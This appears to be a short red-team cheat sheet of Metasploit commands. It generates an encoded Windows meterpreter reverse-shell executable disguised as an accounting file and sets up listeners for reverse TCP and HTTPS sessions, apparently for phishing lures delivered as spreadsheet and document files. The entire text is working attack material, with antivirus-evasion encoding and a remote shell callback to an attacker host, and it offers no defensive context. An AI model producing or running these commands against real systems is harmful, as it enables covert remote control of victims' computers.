## payloads
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.254.201 LPORT=9999 -f exe -o flakebook_accounting.exe -e x86/shikata_ga_nai
# migrate to 64 bit with msfconsole migrate
```
## xls meterpreter setup
```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST 10.0.254.201
set LPORT 9999
run
```
## doc meterpreter setup
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.0.254.201
set LPORT 443
run
```


